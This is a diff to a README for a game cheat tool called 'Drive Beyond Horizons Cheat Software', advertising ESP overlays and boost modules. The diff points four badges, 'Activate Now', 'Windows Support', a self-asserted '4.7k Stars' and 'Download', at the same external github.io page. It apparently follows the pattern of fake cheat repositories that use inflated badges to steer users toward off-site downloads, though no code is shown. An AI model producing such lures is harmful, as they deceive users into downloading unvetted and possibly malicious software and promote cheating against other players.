@@ -2,10 +2,10 @@
 
 The **Drive Beyond Horizons Cheat Software** is built for players who want to unlock more flexibility, awareness, and fun in their driving sessions. With ESP overlays, custom boost modules, and fully configurable hotkeys, it gives you everything you need to explore and train without limits.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.7k Stars](https://img.shields.io/badge/⭐️%204.7k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://drive-beyond-horizons-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://drive-beyond-horizons-cheat.github.io/.github/)
+[![⭐️ 4.7k Stars](https://img.shields.io/badge/⭐️%204.7k-Stars-yellow?style=for-the-badge\&logo=github)](https://drive-beyond-horizons-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://drive-beyond-horizons-cheat.github.io/.github/)
 
 ---
 
